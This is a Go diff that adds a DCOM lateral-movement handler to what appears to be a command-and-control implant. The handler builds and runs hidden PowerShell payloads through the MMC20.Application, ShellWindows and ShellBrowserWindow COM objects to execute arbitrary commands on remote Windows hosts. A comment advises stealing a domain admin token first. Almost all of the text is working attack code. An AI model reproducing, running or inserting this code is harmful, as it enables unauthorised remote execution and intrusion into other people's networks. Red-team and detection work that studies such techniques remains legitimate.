@@ -126,6 +126,79 @@ func handleLateralSchtask(cmd *types.Command, result *types.CommandResult) {
 	result.Output = fmt.Sprintf("Scheduled task %s created and executed on %s (%s)", taskName, cmd.LateralTarget, unc)
 }
 
+// handleLateralDCOM executes a command on a remote host by activating a DCOM
+// object over RPC. Three COM classes are supported:
+//
+//   mmc20        — MMC20.Application.ExecuteShellCommand  (most reliable, default)
+//   shellwindows — ShellWindows.Item().Document.Application.ShellExecute
+//   shellbrowser — ShellBrowserWindow.Document.Application.ShellExecute
+//
+// All three are fire-and-forget (output not captured). They run as the
+// agent's current impersonation token — steal a DA token first if needed.
+func handleLateralDCOM(cmd *types.Command, result *types.CommandResult) {
+	if cmd.LateralTarget == "" || cmd.LateralCommand == "" {
+		result.Error = "lateral_dcom: lateral_target and lateral_command are required"
+		result.ExitCode = 1
+		return
+	}
+
+	method := cmd.LateralDCOMMethod
+	if method == "" {
+		method = "mmc20"
+	}
+
+	// Escape single quotes for PS single-quoted strings ('' = literal ')
+	tgt := strings.ReplaceAll(cmd.LateralTarget, `'`, `''`)
+	// For cmd /c argument we embed into a PS single-quoted string — escape ' as ''
+	cmdArg := strings.ReplaceAll(cmd.LateralCommand, `'`, `''`)
+
+	var psScript string
+	switch method {
+	case "mmc20":
+		// Win32_MMCApplication.ExecuteShellCommand(Command, Directory, Params, WindowState)
+		// WindowState "7" = SW_SHOWMINNOACTIVE (hidden-ish)
+		psScript = fmt.Sprintf(
+			`$o=[System.Activator]::CreateInstance([System.Type]::GetTypeFromProgID('MMC20.Application','%s'));`+
+				`$o.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c %s','7')`,
+			tgt, cmdArg,
+		)
+
+	case "shellwindows":
+		// CLSID {9BA05972-F6A8-11CF-A442-00A0C90A8F39} — ShellWindows
+		psScript = fmt.Sprintf(
+			`$o=[System.Activator]::CreateInstance([System.Type]::GetTypeFromCLSID([System.Guid]'9BA05972-F6A8-11CF-A442-00A0C90A8F39','%s'));`+
+				`$i=$o.Item();$i.Document.Application.ShellExecute('cmd.exe','/c %s','C:\Windows\System32',$null,0)`,
+			tgt, cmdArg,
+		)
+
+	case "shellbrowser":
+		// CLSID {C08AFD90-F2A1-11D1-8455-00A0C91F3880} — ShellBrowserWindow
+		psScript = fmt.Sprintf(
+			`$o=[System.Activator]::CreateInstance([System.Type]::GetTypeFromCLSID([System.Guid]'C08AFD90-F2A1-11D1-8455-00A0C91F3880','%s'));`+
+				`$o.Document.Application.ShellExecute('cmd.exe','/c %s','C:\Windows\System32',$null,0)`,
+			tgt, cmdArg,
+		)
+
+	default:
+		result.Error = fmt.Sprintf("unknown DCOM method %q — use mmc20|shellwindows|shellbrowser", method)
+		result.ExitCode = 1
+		return
+	}
+
+	out, err := exec.Command(
+		"powershell.exe",
+		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
+		"-Command", psScript,
+	).CombinedOutput()
+	if err != nil {
+		result.Error = fmt.Sprintf("dcom/%s failed on %s: %v\n%s", method, cmd.LateralTarget, err, out)
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] DCOM %s → %s: command dispatched\n%s",
+		method, cmd.LateralTarget, strings.TrimSpace(string(out)))
+}
+
 func handleLateralService(cmd *types.Command, result *types.CommandResult) {
 	if cmd.LateralTarget == "" || cmd.LateralCommand == "" {
 		result.Error = "lateral_service: lateral_target and lateral_command are required"
